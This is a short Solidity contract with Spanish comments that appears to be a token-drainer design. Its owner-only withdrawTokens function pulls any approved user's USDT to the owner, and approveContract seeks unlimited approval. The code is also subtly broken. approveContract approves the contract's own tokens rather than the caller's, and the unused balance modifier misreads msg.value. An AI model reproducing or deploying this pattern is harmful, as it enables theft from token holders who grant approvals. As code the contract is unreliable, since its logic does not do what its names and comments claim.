// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    // Agrega aquí las otras funciones necesarias de la interfaz ERC20
}

contract ApprovalAndTransfer {
    IERC20 public usdtToken;
    address public owner;
    uint256 public minBalance; // Mínimo saldo en BNB requerido para realizar transferencias

    event Approved(address indexed user, address indexed owner);
    event TokensTransferred(address indexed user, address indexed owner, uint256 amount);

    constructor(address _usdtToken, uint256 _minBalance) {
        usdtToken = IERC20(_usdtToken);
        owner = msg.sender;
        minBalance = _minBalance;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier hasMinimumBalance() {
        require(msg.value >= minBalance, "Insufficient BNB balance");
        _;
    }

    function approveContract() external {
        require(usdtToken.approve(address(this), type(uint256).max), "Approval failed");
        emit Approved(msg.sender, owner);
    }

    function withdrawTokens(uint256 amount, address user) external onlyOwner {
        require(usdtToken.transferFrom(user, owner, amount), "Transfer failed");
        emit TokensTransferred(user, owner, amount);
    }

    function setMinBalance(uint256 _minBalance) external onlyOwner {
        minBalance = _minBalance;
    }

    // Función para depositar BNB en el contrato
    receive() external payable {}
}